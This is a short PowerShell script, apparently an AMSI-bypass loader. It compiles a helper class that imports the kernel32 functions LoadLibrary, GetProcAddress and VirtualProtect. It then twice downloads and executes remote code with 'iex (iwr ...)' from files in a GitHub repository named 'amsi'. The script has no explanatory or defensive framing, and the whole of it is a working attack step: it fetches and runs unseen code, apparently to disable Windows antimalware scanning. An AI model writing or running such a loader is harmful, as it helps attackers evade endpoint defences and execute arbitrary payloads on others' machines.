$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

sleep 2
iex ( iwr https://raw.githubusercontent.com/volenterk/amsi/refs/heads/main/chunk1.txt -UseBasicParsing)

sleep 2
iex ( iwr https://raw.githubusercontent.com/volenterk/amsi/refs/heads/main/chunk2.txt -UseBasicParsing )